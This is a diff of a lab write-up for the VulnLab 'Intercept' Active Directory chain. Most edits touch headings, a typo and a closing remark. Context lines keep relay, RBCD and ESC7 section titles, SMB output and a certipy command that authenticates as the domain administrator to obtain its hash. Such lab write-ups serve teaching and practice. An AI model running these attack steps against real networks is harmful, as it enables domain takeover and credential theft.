@@ -9,7 +9,7 @@ image: assets/image_start/intercept_slide.png
 description: VL Chain Intercept by Ethicxz
 ---
 
-## Before Starting
+# Before Starting
 
 ```console
 Me > 10.8.2.163
@@ -117,7 +117,7 @@ Post-scan script results:
 |     10.10.152.69 (dc01.intercept.vl)
 |_    10.10.152.70 (ws01.intercept.vl)
 ```
-# Relay attack with responder 
+## Relay attack with responder 
 
 ```bash
 SMB         10.10.152.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
@@ -153,7 +153,7 @@ SMB         10.10.152.70    445    WS01             [+] intercept.vl\KATHRYN.SPE
 ```
 Nice !! (it's also a valid user on the DC btw)
 
-# Relay, Coerce to perform RBCD
+## Coerce, Relay to perform RBCD
 
 After many many enumeration we can find that WEBDAV is enabled on WS01, MAQ is at 10 and ldap signing is disabled :
 
@@ -269,7 +269,7 @@ LDAP        10.10.152.69    389    DC01             Compressing output into /roo
 
 So Simon.Bowen is in HelpDesk group and HelpDesk group have GenericAll Rights on CA-MANAGERS group, keep this information :
 
-# ESC7 Attack
+## ESC7 Attack
 
 Now if we do some ADCS enumeration like that :
 
@@ -359,7 +359,7 @@ certipy req -username 'Simon.Bowen@intercept.vl' -password 'REDACTED' -dc-ip '10
 And get the hash of the Administrator :
 
 ```bash
-ertipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'intercept.vl' -dc-ip 10.10.152.69  
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'intercept.vl' -dc-ip 10.10.152.69  
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Using principal: administrator@intercept.vl
@@ -375,4 +375,4 @@ LDAP        10.10.152.69    389    DC01             [+] intercept.vl\Administrat
 ```
 ![alt text](../assets/image_intercept/6er.png)
 
-Nice ! if you have any questions or comments on this write up you can dm me on [instagram](https://instagram.com/eliott.la) or on discord : 'ethicxz.'
+Nice ! sorry if my english was bad and if you have any questions or comments on this write up you can dm me on [instagram](https://instagram.com/eliott.la) or on discord : 'ethicxz.'
